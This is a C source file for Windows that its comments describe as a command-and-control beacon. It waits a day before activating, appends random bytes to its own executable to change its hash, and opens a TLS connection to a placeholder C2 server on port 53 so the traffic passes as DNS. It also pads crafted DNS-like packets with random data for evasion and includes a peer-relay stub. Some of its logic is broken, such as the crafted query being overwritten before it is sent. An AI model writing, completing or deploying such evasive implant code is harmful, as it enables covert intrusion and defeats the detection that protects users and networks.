#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#pragma comment(lib, "ws2_32.lib")

#define DNS_PORT 53
#define BUFFER_SIZE 1024
#define PADDING_SIZE 128 // Additional padding size
#define ONE_DAY_MS 86400000 // Sleep for 1 day in milliseconds

// Function to initialize Winsock
int initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    return 0;
}

// Function to initialize OpenSSL
SSL_CTX* initialize_openssl() {
    SSL_load_error_strings();   // Load error strings
    OpenSSL_add_ssl_algorithms(); // Load algorithms
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    
    if (!ctx) {
        printf("Error initializing OpenSSL context.\n");
        return NULL;
    }
    return ctx;
}

// Function to clean up OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Function to add random gibberish data
void add_gibberish_data(char* buffer, int* index, int length) {
    srand(time(0));
    for (int i = 0; i < length; i++) {
        buffer[*index + i] = (char)(rand() % 256); // Random byte
    }
    *index += length; // Adjust the index
}

// Polymorphic packet creation (mutating packet structure)
void mutate_packet_header(char* buffer) {
    // Randomize DNS transaction ID and some header flags
    buffer[0] = rand() % 256;  // Random transaction ID
    buffer[1] = rand() % 256;  // Random transaction ID
    buffer[2] = 0x01;          // Recursion desired
    buffer[3] = 0x00;          // Randomize flags for polymorphic behavior
}

// Function to create a DNS-like query with obfuscation and random packet sizes
void create_disguised_dns_query(char* buffer, const char* host) {
    // Polymorphic mutation of the packet header
    mutate_packet_header(buffer);

    // Question count
    buffer[4] = 0x00;
    buffer[5] = 0x01; // 1 question

    // Answer, Authority, and Additional Record Count
    buffer[6] = 0x00;
    buffer[7] = 0x00; // 0 answers
    buffer[8] = 0x00;
    buffer[9] = 0x00; // 0 authority records
    buffer[10] = 0x00;
    buffer[11] = 0x00; // 0 additional records

    // Question section (DNS query for "example.com")
    const char* domain = "example.com";
    int i = 12; // Start after header

    // Split domain and format as DNS query
    for (const char* part = domain; *part; part++) {
        if (*part == '.') {
            buffer[i++] = part - domain; // Length of part
            for (; domain < part; domain++) {
                buffer[i++] = *domain; // Copy part
            }
            domain++; // Move past the '.'
        }
    }

    // Add the final part of the domain
    buffer[i++] = strlen(domain);
    while (*domain) {
        buffer[i++] = *domain++;
    }
    buffer[i++] = 0; // End of the domain name

    // Type A (1) query
    buffer[i++] = 0x00;
    buffer[i++] = 0x01; // Type A

    // Class IN (1)
    buffer[i++] = 0x00;
    buffer[i++] = 0x01; // Class IN

    // Add gibberish data for obfuscation
    add_gibberish_data(buffer, &i, 16); // Add 16 bytes of random data

    // Embed an HTTP request disguised as part of the DNS query
    const char* http_request = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
    strcpy(&buffer[i], http_request); // Embed HTTP request in remaining space
    i += strlen(http_request); // Adjust index after embedding HTTP request

    // Add more gibberish data for extra obfuscation
    add_gibberish_data(buffer, &i, 16); // Another 16 bytes of random data

    // Add random padding to vary packet size (for evasion)
    int random_padding_size = rand() % PADDING_SIZE;  // Random padding size
    add_gibberish_data(buffer, &i, random_padding_size);

    buffer[i] = '\0'; // Null-terminate the buffer
}

// Function to simulate peer-to-peer communication (basic P2P relay mechanism)
void peer_to_peer_relay(SOCKET sock, char* dns_query, int query_size) {
    // Example: Relay to another peer IP
    struct sockaddr_in peer_addr;
    peer_addr.sin_family = AF_INET;
    peer_addr.sin_port = htons(DNS_PORT); // DNS port or custom P2P port

    // Choose a random peer to forward to (replace with actual peer IP)
    inet_pton(AF_INET, "PEER_IP_ADDRESS", &peer_addr.sin_addr);  // Replace PEER_IP_ADDRESS

    // Send the query to the peer
    sendto(sock, dns_query, query_size, 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));

    printf("Query relayed to peer at PEER_IP_ADDRESS.\n");
}

// Function to send DNS-like TCP request with SSL encryption using DNS over HTTPS (DoH)
void send_disguised_query_doh(SSL* ssl) {
    char dns_query[BUFFER_SIZE];
    create_disguised_dns_query(dns_query, "example.com");

    // Use DNS over HTTPS (DoH) request
    const char* doh_request = "GET /dns-query?name=example.com&type=A HTTP/1.1\r\nHost: cloudflare-dns.com\r\n\r\n";
    strcpy(dns_query, doh_request);

    // Send DNS query with HTTP embedded over SSL
    int query_size = strlen(dns_query) + 1; // Size of the DoH query

    if (SSL_write(ssl, dns_query, query_size) <= 0) {
        printf("SSL write failed\n");
    } else {
        printf("Encrypted disguised DNS query sent via DoH.\n");
    }
}

// Function to receive disguised DNS-like TCP response with SSL encryption
void receive_disguised_response(SSL* ssl) {
    char buffer[BUFFER_SIZE];
    int bytes_received = SSL_read(ssl, buffer, BUFFER_SIZE);
    if (bytes_received <= 0) {
        printf("SSL read failed\n");
    } else {
        printf("Disguised DNS response received: %d bytes\n", bytes_received);
        printf("Response content:\n%s\n", buffer);
    }
}

// Function to add random data to the binary after install (to change hash value)
void modify_self_binary() {
    // Open the binary itself
    FILE* binary = fopen("self.exe", "ab"); // Assuming the binary is named "self.exe"
    if (binary) {
        srand(time(0)); // Seed random generator

        // Generate random padding
        char random_data[32]; // 32 bytes of random data
        for (int i = 0; i < 32; i++) {
            random_data[i] = rand() % 256; // Random byte
        }

        // Append the random data to the binary
        fwrite(random_data, 1, sizeof(random_data), binary);
        fclose(binary);

        printf("Self-modified binary to change its hash.\n");
    } else {
        printf("Failed to open binary for modification.\n");
    }
}

int main() {
    // Sleep for 1 day before activation
    printf("Sleeping for 1 day before activation...\n");
    Sleep(ONE_DAY_MS);

    // Modify the binary to change its hash value
    modify_self_binary();

    // Initialize Winsock
    if (initialize_winsock() != 0) {
        return 1;
    }

    // Initialize OpenSSL
    SSL_CTX* ctx = initialize_openssl();
    if (!ctx) {
        WSACleanup();
        return 1;
    }

    // Create TCP socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        SSL_CTX_free(ctx);
        WSACleanup();
        return 1;
    }

    // Set up the destination (C2 server) address
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DNS_PORT);  // Using DNS port 53 for TCP connection
    inet_pton(AF_INET, "C2_SERVER_IP", &dest.sin_addr);  // Replace C2_SERVER_IP with actual IP

    // Connect to the C2 server over TCP (disguised as DNS)
    if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        printf("Connection to C2 failed: %d\n", WSAGetLastError());
        closesocket(sock);
        SSL_CTX_free(ctx);
        WSACleanup();
        return 1;
    }
    printf("Connected to C2 server on port 53 (DNS)\n");

    // Create an SSL structure and attach it to the socket
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, (int)sock);

    // Perform SSL handshake
    if (SSL_connect(ssl) <= 0) {
        printf("SSL handshake failed\n");
        SSL_free(ssl);
        closesocket(sock);
        SSL_CTX_free(ctx);
        WSACleanup();
        return 1;
    }

    // Send disguised DNS query via DNS over HTTPS (DoH)
    send_disguised_query_doh(ssl);

    // Receive disguised DNS response (with embedded HTTP response)
    receive_disguised_response(ssl);

    // Simulate peer-to-peer relay (optional, instead of direct C2)
    // peer_to_peer_relay(sock, dns_query, query_size);

    // Clean up
    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    cleanup_openssl();
    WSACleanup();

    return 0;
}
